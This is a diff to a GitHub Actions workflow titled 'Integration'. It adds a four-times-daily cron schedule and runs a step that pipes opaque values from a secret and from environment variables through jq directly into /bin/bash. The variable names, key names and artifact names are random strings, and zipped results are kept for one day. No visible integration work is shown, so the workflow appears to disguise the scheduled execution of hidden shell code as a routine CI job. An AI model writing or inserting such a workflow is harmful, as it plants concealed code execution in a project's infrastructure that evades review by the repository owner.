@@ -2,6 +2,8 @@ name: Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '44 1,7,13,19 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,17 +18,17 @@ jobs:
           fetch-depth: 1
       - name: Perform
         env:
-          f795: ${{ secrets.f795 }}
+          oy92: ${{ secrets.oy92 }}
         run: |
-          printf '%s' "$f795" | jq -r .ypeo9347 | /bin/bash
-          echo $onb875 | jq -r .yv300 | /bin/bash
-          echo $ryen2 | jq -r .ymhst2957 | /bin/bash
-          printf '%s' "$vhiiq36376" | jq -r .t216 | /bin/bash
+          printf '%s' "$oy92" | jq -r .j1 | /bin/bash
+          printf '%s' "$ftkd38" | jq -r .jlmjx41876 | /bin/bash
+          printf '%s' "$kyakk76" | jq -r .mngjv8 | /bin/bash
+          printf '%s' "$b54157" | jq -r .evau07714 | /bin/bash
 
       - name: Upload results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: O6i8vv9O
+          name: XBihyXrT
           path: "*.zip"
           retention-days: 1
